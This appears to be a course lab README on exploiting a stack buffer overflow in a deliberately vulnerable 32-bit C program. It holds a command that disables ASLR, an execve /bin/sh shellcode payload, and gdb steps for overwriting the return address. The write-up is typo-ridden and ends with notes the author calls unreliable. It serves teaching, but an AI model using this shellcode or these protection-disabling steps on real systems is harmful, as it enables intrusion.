# Lab6

Learn to do a good old overflow.

## Files

* shell.c - a simple example of running a shell code from memory
* vulnerable.c - first version of the program
* mystack.c - the program that will be exploited, same as vulnerable.c, but has
a timeout to allow us to inspect the memory wit `gdb`


## Preparations

### Compilation

The flags are set on the Makefil.

To binary is for 32bit arch, no stack protectors, and executable memory on stack

* `-m32` -> compile for 32bit arch
* `-fno-stack-procetor` -> disable stack guards and whatever
* `-z execstack` -> no W^X limits, any memmory page can be executed

### ASLR

Turn of addres space randomization layout thing

```
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```

This will keep the same memory address for our variables and buffers


### Debugger

Use GDB, but with the "[peda](https://github.com/longld/peda.git)" estension.

Installation:

```
git clone https://github.com/longld/peda.git ~/peda
echo "source ~/peda/peda.py" >> ~/.gdbinit
```


## The script

Use `make mys` to compile the program, make sure the lines for the `while` loop
are NOT commented

```
./mys $(python2 -c 'print ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80" +"A"*7)')
```

From another terminal run `gdb attach $(which mys)`

Create a break point at the line with `strcpy` e.g. `break mystack.c:14`
Type `continue`

After all the timeout we can look at the *buffer* address `p &buffer`
as well as the EBP address

```
EBP: 0xffffcfd8 --> 0xffffcff8 --> 0x0
$1 = (char (*)[32]) 0xffffcfb0
```

## Target

THe purpose is to find the address of the EBP and `buffer`, compute the difference
between them, to know how much the payload needs to be and overwrite this addresses.

The memory layout is ass fallows:

```
	return address
		old EDP
	calle registers
		buffer
```

What we want is the overwrite the "return address" whit "buffer" address.
But we have to keep the same EDP

If compiled for 32 bit architecture, the difference between the EDB and buffer
should be 0x28 which is 40 in hex. 32 of which is our buffer, so there are 8
bytes left to overwrite.

The "exec.sh" script is calling the `mys` program with the payload:

* the shell code
* a 7 bytes padding to fill up all 32 bytes of the buffer array

Next, we take the addreses of the EDB and buffer and append them to the payload.
The addresses have to be in hex, and because of the way bytes are stored in memory
we write them from write to left.

If the EDP address is "0xffffcfd8" then we write: "\xd8\xcf\xff\xff"


__________

Caution, bad notes ahead:

### Values

first run:

EBP: 0xffffcfd8 --> 0xffffcff8 --> 0x0
$1 = (char (*)[32]) 0xffffcfb0

CFD8 - CFB0 = 40 
40 - 32 = 8 padding

second run:

EBP: 0xffffcfb8 --> 0xffffcfd8 --> 0x0
$1 = (char (*)[32]) 0xffffcf90

CFB8 - CF90 = 40
